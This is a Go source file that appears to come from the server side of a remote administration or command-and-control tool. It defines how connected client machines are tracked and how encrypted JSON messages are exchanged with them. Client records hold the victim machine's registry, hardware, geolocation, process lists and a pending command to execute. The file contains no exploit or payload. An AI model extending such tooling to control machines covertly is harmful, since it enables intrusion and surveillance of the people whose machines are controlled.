package server

// This file needs to be reorganized and rewritten with a better consensus for where
// the client data is kept and accessed. It will most likely be replaced with a database system.

import (
	"bytes"
	"encoding/json"
	"net"
	"time"

	"github.com/codeuk/pout/cmd/helper"
	"github.com/codeuk/pout/cmd/network"

	so "github.com/iamacarpet/go-win64api/shared"
)

// `Process` represents the attributes of a running process on the machine.
type Process struct {
	PID    string `json:"process_id"`
	Name   string `json:"executable_name"`
	Type   string `json:"session_type"`
	Memory string `json:"mem_usage"`
}

// `ProcessMonitor` represents the attributes required to display processes.
type ProcessMonitor struct {
	ProcessUpdateTime    int32     `json:"update_time"`
	LastUpdatedProcesses time.Time `json:"last_updated"`
	KillingProcess       bool      `json:"killing_process"`
}

// `RegistryTable` represents a database of information gathered from the clients Windows registry.
type RegistryTable struct {
	HWID            string `json:"hardware_id"`
	Version         string `json:"windows_version"`
	CurrentUserName string `json:"current_user_name"`
	ProductName     string `json:"product_name"`
	ProductId       string `json:"product_id"`
	InstallDate     string `json:"install_date"`
	RegisteredOwner string `json:"registered_owner"`
	RegisteredOrg   string `json:"registered_organization"`
}

// `SystemTable` represents a database of information gathered from the clients general system.
type SystemTable struct {
	Registry RegistryTable      `json:"registry_information"`
	Hardware so.Hardware        `json:"hardware_information"`
	OS       so.OperatingSystem `json:"operating_system_information"`
	Memory   so.Memory          `json:"memory_information"`
	Disk     []so.Disk          `json:"disk_information"`
	Network  []so.Network       `json:"network_information"`
}

// `MetaData` represents the clients information storage database.
type MetaData struct {
	IP            string              `json:"ip_address"`
	Name          string              `json:"machine_name"`
	Arch          string              `json:"architecture"`
	Access        string              `json:"access_privileges"`
	System        SystemTable         `json:"system_information,omitempty"`
	Geo           network.GeoLocation `json:"geolocation,omitempty"`
	Processes     []Process           `json:"running_processes,omitempty"`
	EncryptionKey []byte              `json:"encryption_key,omitempty"`
}

// `CmdData` represents the latest data to be sent and recieved from the client.
type CmdData struct {
	CommandToExecute string
	CommandOutput    string
}

// `Client` represents a client connection.
type Client struct {
	Parent       *Server
	SessionID    string
	Conn         net.Conn
	RawAddr      string
	MetaData     MetaData
	UserDataPath string
	Connected    time.Time

	ProcessMonitor ProcessMonitor
	CmdData        CmdData
	InputLocked    bool
}

// `Client.ReadMessage` reads all data from the connection as an array of bytes
// and reads it into and returns it as a parsable Message struct.
func (c *Client) ReadMessage() (Message, error) {
	var message Message

	// Read the JSON Marshal from the server.
	messageBytesEnc, err := c.ReadAll()
	if err != nil {
		return message, err
	}

	// Decrypt the encrypted Message structs bytes.
	messageBytesDec, err := helper.Decrypt(messageBytesEnc, c.MetaData.EncryptionKey)
	if err != nil {
		return message, err
	}

	// Deserialize the received data into a Message struct.
	err = json.Unmarshal(messageBytesDec, &message)

	return message, err
}

// `Client.ReadBytes` reads data from the connection and returns it as an array of bytes.
// The function reads up to the set BUFFER amount of bytes from the connection.
// If an error occurs during reading, the function returns an empty string and the error.
func (c *Client) ReadBytes(requestBuffer int) ([]byte, error) {
	// Create a buffer to store the received data.
	data := make([]byte, requestBuffer)
	n, err := c.Conn.Read(data)
	if err != nil {
		return []byte{}, err
	}

	// Update the parent servers recieved byte count.
	c.Parent.RecvBytes += n

	// Return the valid slice of the recieved data.
	return data[:n], nil
}

// `Client.ReadAll` reads all data from the connection and returns it as an array of bytes.
// This function could be exploited on the client side, and is just another reason why
// client packet authentication needs to be implemented.
func (c *Client) ReadAll() ([]byte, error) {
	var buf bytes.Buffer

	// Create a temporary buffer (size STD_BUFFER) to store the recieved data.
	tmp := make([]byte, STD_BUFFER)
	for {
		// Read this iterations data chunk.
		n, err := c.Conn.Read(tmp)
		if err != nil {
			return []byte{}, err
		}

		// Update the parent servers recieved byte count.
		c.Parent.RecvBytes += n

		// Write this iterations data chunk to the main buffer.
		buf.Write(tmp[:n])
		if n < len(tmp) {
			break
		}
	}

	return buf.Bytes(), nil
}

// `Client.SendMessage` sends the passed data to the client connection.
func (c *Client) SendMessage(message Message) error {
	// Serialize the Message into JSON format (bytes).
	messageJson, _ := json.Marshal(message)

	// Encrypt the Message structs bytes.
	messageJsonEnc, err := helper.Encrypt(messageJson, c.MetaData.EncryptionKey)
	if err != nil {
		return err
	}

	// Send the serialized and encrypted Message to the client.
	return c.SendBytes(messageJsonEnc)
}

// `Client.SendBytes` sends the passed data to the client connection as an array of bytes.
func (c *Client) SendBytes(data []byte) error {
	// Create a buffer to store the received data.
	n, err := c.Conn.Write(data)

	// Update the parent servers sent byte count.
	c.Parent.SentBytes += n

	return err
}
